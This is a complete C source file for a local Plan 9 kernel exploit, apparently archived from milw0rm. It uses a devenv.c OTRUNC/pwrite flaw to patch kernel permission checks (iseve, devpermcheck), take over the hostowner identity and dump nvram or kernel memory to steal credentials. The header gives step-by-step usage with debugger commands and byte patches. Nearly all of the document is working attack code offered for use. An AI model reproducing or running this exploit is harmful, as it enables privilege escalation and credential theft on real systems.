<html><head><title>Plan 9 Kernel (devenv.c OTRUNC/pwrite) Local Exploit</title></head><pre>/* !!! DO NOT DISTRIBUTE !!! */

/* identity theft 
 *
 * this exploit uses my devenv.c OTRUNC/pwrite vulnerability
 * to overwrite specific kernel addresses to help elevate our
 * privileges. this exploit is *very* picky, so you *must*
 * understand the plan9 kernel and know what you are
 * doing, though a best-practice usage example will 
 * guide new users.
 *
 * the exploit process is:
 *	1) determine the user we're running as
 *	2) determine the hostowner for the server
 *	3) overwrite specific kernel addresses
 *	4) write our username to  '#c/hostowner' 
 *	5) steal credentials by copying nvram or paging
 *		through kernel memory for resident creds
 *	6) reset previously overwritten functions 
 *	7) write the original username back to '#c/hostowner'
 *
 * a best practice usage example is to overwrite iseve() so
 * the kernel is tricked into thinking we're the host owner. 
 * secondly, we can overwrite devpermcheck() to trick the
 * kernel into thinking we have permissions to access any
 * given in-kernel device file. this will give us immediate
 * access to things like /srv/fscons and '#S/sdC0/nvram'. 
 *
 * to get the address you want to overwrite, use the plan9
 * debugger after you figure out which kernel the system
 * is booting:
 *
 * cpu% acid /386/9pccpu
 * /386/9pccpu:386 plan 9 boot image
 *
 * /sys/lib/acid/port
 * /sys/lib/acid/386
 * acid: print(iseve)
 * 0xf018d3db
 * acid: mem(iseve, &quot;X&quot;)
 * 0x8b0cec83
 * acid: print(devpermcheck)
 * 0xf0192a6b
 * acid: mem(devpermcheck, &quot;X&quot;)
 * 0x8b14ec83
 * acid: ^D
 * cpu% ./itheft -n -o nvram.img -s 0,1024 \
 *	-k 0xf018d3db,83ec0c8b,31c040c3 \
 *	-k 0xf0192a6b,83ec148b,31c040c3
 *
 * as you can see, we overwrite the function addresses in 
 * kmem with:
 *
 *	xorl %eax, %eax
 *	incl %eax
 *	retl
 *
 * a note on exploit effects. 
 * when we overwrite '#c/hostowner', the kernel 
 * automatically changes all processes owned by the 
 * previous hostowner id to the new id. when the exploit
 * has obtained the target information from the kernel, it
 * will write the previous hostowner id to '#c/hostowner'. 
 * since *your* id was now just the hostowner id, this 
 * second write will alter *your* bin/rc instance's owner
 * to the id of the original hostowner. this may seem 
 * desirable, however it isn't. the reason is that despite 
 * having access to the hostowner's name, we don't have
 * access to the hostowner's credentials. thus, access to
 * their files and factotum is still disabled. 
 * 
 * therefore, it's best to immediately exit your CPU shell
 * once the exploit is finished. 
 *
 * lastly, when using a target of Tmem, expect a kernel 
 * panic when you trigger a page fault with a bad address. 
 * make sure you define an appropriate base and ceiling 
 * when paging through memory. 
 *
 * NB: it'd be nice to have a memory disclosure exploit that's
 * as reliable as this one to help verify whether or not the 
 * kernel addresses are as expected (whether or not we've
 * ran bin/acid on the appropriate kernel and obtained the
 * correct kernel addresses)
 *
 * Don &quot;north&quot; Bailey 12/27/06
 * don.bailey@gmail.com
 *
 * you say the hill is too steep to climb
 * you say you'd like to see me try
 * you pick the place and I'll choose the time
 * and I'll climb the hill in my own way
 *  - gilmour/waters
 */

#include &lt;u.h&gt;
#include &lt;libc.h&gt;

enum
{
	False,
	True,
};

enum
{
	Anew,
	Aold,
};

enum
{
	Tmem,
	Tnvram,
};

typedef struct Seg Seg;
typedef struct Kfunc Kfunc;

struct
Seg
{
	ulong base;
	ulong ceiling;
};

struct
Kfunc
{
	int nnew;
	int nold;
	vlong addr;
	uchar * new;
	uchar * old;
	Kfunc * next; 
};

static int outfd;
static int envfd;
static char * us;
static Seg * seg;
static int pagesz;
static Kfunc * kf;
static char * them;
static char * outfile;
static char * envpath;
static int target = Tnvram;

static int spin(void);
static int steal(void);
static int kwrite(int);
static void usage(void);
static int addk(char * );
static int envfile(void);
static uchar gethex(char);
static void cleanup(void);
static int getpagesz(void);
static int envremove(void);
static int addseg(char * );
static void delk(Kfunc ** );
static int myidentity(void);
static int stealfile(char * );
static int youridentity(void);
static int sethostowner(char * );
static void err(const char *, ... );
static void msg(const char *, ... );
static int arguments(int, char ** );
static int userfile(char *, char ** );
static void xstrdup(char *, char ** );
static int parsebytes(char *, uchar **, int * );

void
main(int argc, char * argv[])
{
	int e;

	e = arguments(argc, argv);
	if(!e)
		usage();
	else
		e = spin();

	cleanup();

	if(e)
		exits(nil);

	exits(&quot;you suck as a thief&quot;);
}

static void
cleanup(void)
{
	Kfunc * k;
	Kfunc * l;

	if(us)
		free(us);
	if(seg)
		free(seg);
	if(them)
		free(them);
	if(outfile)
		free(outfile);
	if(envpath)
		free(envpath);

	if(envfd &gt; 0)
		close(envfd);
	if(outfd &gt; 0)
		close(outfd);

	for(k = kf; k; k = l)
	{
		l = k-&gt;next;
		delk(&amp;k);
	}
}

static void
usage(void)
{
	fprint(
		2, 
		&quot;usage: ithief [-{n|m}] -s base,ceiling &quot;
		&quot;-o outfile -k ... [-k ... ]\n&quot;);
}

static int
arguments(int argc, char ** argv)
{
	char * p;

	ARGBEGIN
	{
	case 'n':
		{
			target = Tnvram;
			break;
		}
	case 'm':
		{
			target = Tmem;
			break;
		}
	case 's':
		{
			p = ARGF();
			if(!p)
			{
				err(&quot;option 's' needs an argument&quot;);
				return False;
			}

			if(!addseg(p))
				return False;

			break;
		}
	case 'k':
		{
			p = ARGF();
			if(!p)
			{
				err(&quot;option 'k' needs an argument&quot;);
				return False;
			}

			if(!addk(p))
				return False;

			break;
		}
	case 'o':
		{
			p = ARGF();
			if(!p)
			{
				err(&quot;option 'o' needs an argument&quot;);
				return False;
			}

			if(outfile)
			{
				err(&quot;option 'o' already set&quot;);
				return False;
			}

			xstrdup(p, &amp;outfile);
			break;
		}
	default:
		{
			err(&quot;unknown option '%c'&quot;, ARGC());
			return False;
		}
	}
	ARGEND

	if(!kf)
	{
		err(&quot;at least one 'k' is required&quot;);
		return False;
	}

	if(!seg)
	{
		err(&quot;one 's' is required&quot;);
		return False;
	}

	if(!outfile)
	{
		err(&quot;an output file is required&quot;);
		return False;
	}

	return True;
}

static void
err(const char * fmt, ... )
{
	va_list v;

	va_start(v, fmt);

	fprint(2, &quot;error: &quot;);
	vfprint(2, fmt, v);
	fprint(2, &quot;\n&quot;);

	va_end(v);
}

static void
msg(const char * fmt, ... )
{
	va_list v;

	va_start(v, fmt);

	fprint(1, &quot;ithief: &quot;);
	vfprint(1, fmt, v);
	fprint(1, &quot;\n&quot;);

	va_end(v);
}

static void
xstrdup(char * in, char ** outp)
{
	char * out;
	int sz;

	sz = strlen(in) + 1;

	out = calloc(1, sz);
	if(!out)
	{
		perror(&quot;calloc&quot;);
		abort();
	}

	memcpy(out, in, sz);
	*outp = out;
}

static int
addk(char * p)
{
	Kfunc * kp;
	Kfunc * k;
	char * c;
	char * e;
	char t;

	k = calloc(1, sizeof *k);
	if(!k)
	{
		perror(&quot;calloc&quot;);
		abort();
	}

	for(c = p; *c &amp;&amp; *c != ','; c++)
		;
	t = *c;
	*c = 0;

	k-&gt;addr = strtoull(p, 0, 0);
	*c = t;

	if(!t)
		goto _fail;

	for(e = ++c; *c &amp;&amp; *c != ','; c++)
		;
	t = *c;
	*c = 0;

	if(!parsebytes(e, &amp;k-&gt;old, &amp;k-&gt;nold))
		goto _fail;

	if(!t)
		goto _fail;

	for(e = ++c; *c; c++)
		;

	if(!parsebytes(e, &amp;k-&gt;new, &amp;k-&gt;nnew))
		goto _fail;

	for(kp = kf; kp &amp;&amp; kp-&gt;next; kp = kp-&gt;next)
		;
	if(!kp)
		kf = k;
	else
		kp-&gt;next = k;

	return True;

_fail:
	err(&quot;invalid K syntax&quot;);
	delk(&amp;k);
	return False;
}

static void
delk(Kfunc ** kp)
{
	Kfunc * k;

	k = *kp;
	*kp = nil;

	if(k-&gt;new)
		free(k-&gt;new);
	if(k-&gt;old)
		free(k-&gt;old);

	free(k);
}

static int
parsebytes(char * p, uchar ** bytesp, int * np)
{
	uchar * bytes;
	uchar byte;
	int n;

	n = strlen(p);
	if(n % 2)
	{
		err(&quot;the byte stream must be an even length&quot;);
		return False;
	}

	n = 0;
	bytes = nil;

	while(p[0] &amp;&amp; p[1])
	{
		byte = gethex(p[0]) &lt;&lt; 4 | gethex(p[1]);
		bytes = realloc(bytes, (n + 1) * sizeof *bytes);
		bytes[n++] = byte;
		p += 2;
	}

	*bytesp = bytes;
	*np = n;

	return True;
}

static uchar 
gethex(char c)
{
	return (c &gt;= '0' &amp;&amp; c &lt;= '9') ? c - '0' :
			(c &gt;= 'a' &amp;&amp; c &lt;= 'f') ? c - 'a' + 10 :
				(c &gt;= 'A' &amp;&amp; c &lt;= 'F') ? c - 'A' + 10 :
					-1;
}

static int
spin(void)
{
	outfd = create(outfile, OWRITE, 0600);
	if(outfd &lt; 0)
	{
		err(&quot;can't create \&quot;%s\&quot;: %r&quot;, outfile);
		return False;
	}

	if(!getpagesz())
		return False;

	if(!myidentity())
		return False;

	if(!youridentity())
		return False;

	if(!envfile())
		return False;

	if(!kwrite(Anew))
		return False;

	if(!sethostowner(us))
		return False;

	if(!steal())
		return False;

	if(!kwrite(Aold))
		return False;

	if(!sethostowner(them))
		return False;

	return envremove();
}

static int
getpagesz(void)
{
	char buffer[64];
	char * p;
	char * q;
	int fd;
	int e;

	fd = open(&quot;#c/swap&quot;, OREAD);
	if(fd &lt; 0)
	{
		err(&quot;can't open \&quot;#c/swap\&quot;: %r&quot;);
		return False;
	}

	e = read(fd, buffer, sizeof buffer);
	if(e &lt; 0)
	{
		err(&quot;can't read \&quot;#c/swap\&quot;: %r&quot;);
		close(fd);
		return False;
	}

	close(fd);

	for(p = buffer; (p - buffer) &lt; sizeof buffer &amp;&amp; *p != '\n'; p++)
		;
	for(q = ++p; 
		(q - buffer) &lt; sizeof buffer &amp;&amp; (*q != ' ' &amp;&amp; *q != '\t'); 
		q++)
		;
	*q = 0;

	pagesz = strtoul(p, 0, 0);
	msg(&quot;the system page size is %d&quot;, pagesz);

	return True;
}

static int
myidentity(void)
{
	if(!userfile(&quot;#c/user&quot;, &amp;us))
		return False;

	msg(&quot;we are \&quot;%s\&quot;&quot;, us);
	return True;
}

static int
youridentity(void)
{
	if(!userfile(&quot;#c/hostowner&quot;, &amp;them))
		return False;

	if(!strcmp(us, them))
	{
		err(&quot;we are the hostowner, genius&quot;);
		return False;
	}

	msg(&quot;they are \&quot;%s\&quot;&quot;, them);
	return True;
}

static int
userfile(char * uf, char ** namep)
{
	char buffer[1024];
	int fd;
	int n;

	fd = open(uf, OREAD);
	if(fd &lt; 0)
	{
		err(&quot;can't obtain an username from \&quot;%s\&quot;: %r&quot;, uf);
		return False;
	}

	n = read(fd, buffer, sizeof buffer);
	if(n &lt;= 0)
	{
		err(&quot;bad read on \&quot;%s\&quot;? %r&quot;);
		close(fd);
		return False;
	}

	if(n == sizeof buffer)
		n = sizeof buffer - 1;

	buffer[n] = 0;

	close(fd);
	xstrdup(buffer, namep);

	return True;
}

static int
envfile(void)
{
	char buffer[32];
	char * p;
	int fd;

	/* easier to just create our own and rm it */

	snprint(buffer, sizeof buffer, &quot;#e/XXXXXXXXXXX&quot;);

	p = mktemp(buffer);
	if(!p[0] || (p[0] == '/' &amp;&amp; !p[1]))
	{
		err(&quot;mktemp failed: %r&quot;);
		return False;
	}

	msg(&quot;creating \&quot;%s\&quot;&quot;, p);

	fd = create(p, ORDWR, 0600);
	if(fd &lt; 0)
	{
		err(&quot;can't create \&quot;%s\&quot;: %r&quot;, p);
		return False;
	}

	msg(&quot;truncating \&quot;%s\&quot;&quot;, p);
	close(fd);

	fd = open(p, OWRITE|OTRUNC);
	if(fd &lt; 0)
	{
		err(&quot;can't open \&quot;%s\&quot;: %r&quot;, p);
		return False;
	}

	msg(&quot;\&quot;%s\&quot; is ready for manipulation&quot;, p);

	xstrdup(buffer, &amp;envpath);
	envfd = fd;

	return True;
}

static int
kwrite(int obj)
{
	Kfunc * k;
	uchar * p;
	long b;
	long n;

	for(k = kf; k; k = k-&gt;next)
	{
		if(obj == Anew)
		{
			p = k-&gt;new;
			b = k-&gt;nnew;
		}
		else
		{
			p = k-&gt;old;
			b = k-&gt;nold;
		}

		msg(
			&quot;writing %d %s bytes to %lluX&quot;, 
			b, 
			obj == Anew ? &quot;new&quot; : &quot;old&quot;, 
			k-&gt;addr);

		n = pwrite(envfd, p, b, k-&gt;addr);
		if(n != b)
		{
			err(&quot;failed to write to \&quot;%s\&quot;: %r&quot;, envpath);
			return False;
		}
	}

	return True;
}

static int
sethostowner(char * new)
{
	char * test;
	int fd;
	int n;
	int e;

	fd = open(&quot;#c/hostowner&quot;, OWRITE);
	if(fd &lt; 0)
	{
		err(&quot;can't open \&quot;#c/hostowner\&quot;: %r&quot;);
		return False;
	}

	n = strlen(new);

	e = write(fd, new, n);
	if(e != n)
	{
		err(&quot;write to \&quot;#c/hostowner\&quot; failed: %r&quot;);
		close(fd);
		return False;
	}

	close(fd);
	msg(&quot;write of \&quot;%s\&quot; to \&quot;#c/hostowner\&quot; succeeded&quot;, new);

	if(!userfile(&quot;#c/hostowner&quot;, &amp;test))
	{
		err(&quot;can't retrieve \&quot;#c/hostowner\&quot; for comparison?&quot;);
		return False;
	}

	e = strcmp(new, test) == 0;
	if(!e)
	{
		err(
			&quot;write on \&quot;#c/hostowner\&quot; succeeded but stored&quot;
			&quot;value isn't as expected: \&quot;%s\&quot;&quot;, 
			test);
	}

	free(test);

	return e;
}

static int
steal(void)
{
	char buffer[32];

	if(target == Tnvram)
		return stealfile(&quot;#S/sdC0/nvram&quot;);

	snprint(buffer, sizeof buffer, &quot;#p/%d/mem&quot;, getpid());

	return stealfile(buffer);
}

static int
stealfile(char * path)
{
	uchar * page;
	ulong addr;
	long n;
	int fd;

	msg(&quot;opening \&quot;%s\&quot; for imaging&quot;, path);

	fd = open(path, OREAD);
	if(fd &lt; 0)
	{
		err(&quot;can't open \&quot;%s\&quot;: %r&quot;, path);
		return False;
	}

	page = calloc(1, pagesz);
	if(!page)
	{
		err(&quot;calloc failed: %r&quot;);
		abort();
	}

	addr = seg-&gt;base;

	while(addr &lt; seg-&gt;ceiling)
	{
		n = pread(fd, page, pagesz, addr);
		if(n &lt;= 0)
		{
			if(n &lt; 0)
				err(&quot;read on \&quot;%s\&quot; failed: %r&quot;, path);
			break;
		}

		write(outfd, page, n);
		addr += n;
	}

	return True;
}

static int
envremove(void)
{
	remove(envpath);
	return True;
}

static int
addseg(char * p)
{
	ulong ceiling;
	ulong base;
	char * c;
	Seg * s;
	char t;

	if(seg)
	{
		err(&quot;only one segment can be defined&quot;);
		return False;
	}

	for(c = p; *c &amp;&amp; *c != ','; c++)
		;
	if(!*c)
	{
		err(&quot;invalid seg syntax&quot;);
		return False;
	}

	t = *c;
	*c = 0;

	base = strtoul(p, 0, 0);
	*c++ = t;

	ceiling = strtoul(c, 0, 0);

	if(ceiling &lt;= base)
	{
		err(&quot;invalid seg syntax; ceiling &lt;= base&quot;);
		return False;
	}

	s = calloc(1, sizeof *s);
	if(!s)
	{
		perror(&quot;calloc&quot;);
		abort();
	}

	s-&gt;base = base;
	s-&gt;ceiling = ceiling;

	msg(&quot;using a segment of %luX -&gt; %luX&quot;, s-&gt;base, s-&gt;ceiling);

	seg = s;

	return True;
}

// milw0rm.com [2007-02-28]</pre></html>